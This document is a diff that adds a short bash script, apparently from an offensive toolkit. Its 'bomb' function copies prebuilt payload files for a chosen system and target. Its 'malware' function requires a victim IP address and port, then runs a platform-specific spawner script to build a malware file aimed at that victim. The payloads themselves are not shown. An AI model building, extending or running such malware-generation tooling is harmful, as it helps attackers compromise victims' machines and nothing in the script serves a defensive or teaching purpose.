@@ -1,0 +1,25 @@
+source $PODGL/lib/fsh.cfg.sh
+
+
+bomb(){
+   cp $PODGL/sys/bomb/$SYSTEM/$TARGET/a.* ./$1 &> /dev/null
+   if [ "$?" != 0 ]; then
+     cerr "One Or More Option Are not valid, try again with show options and options"
+   fi
+}
+
+malware(){
+   if [ "$VICTIM" == '' ] || [ "$PORT" == '' ]; then
+     cerr "Victim IP Address or PORT Are not set, use victim command"
+     exit 1
+   fi
+   cout "Building $1..."
+   sleep 1
+   bash $PODGL/sys/malware/$MALWARE/$PLATFORM/$TYPE/spawner.sh $VICTIM $PORT $1 &> /dev/null
+   if [ ! -f "$1" ]; then
+       cerr "An Error Was Occured While Building $1, use show options or show values and set all required values"
+       exit 1
+   fi
+}
+
+$WHAT $1
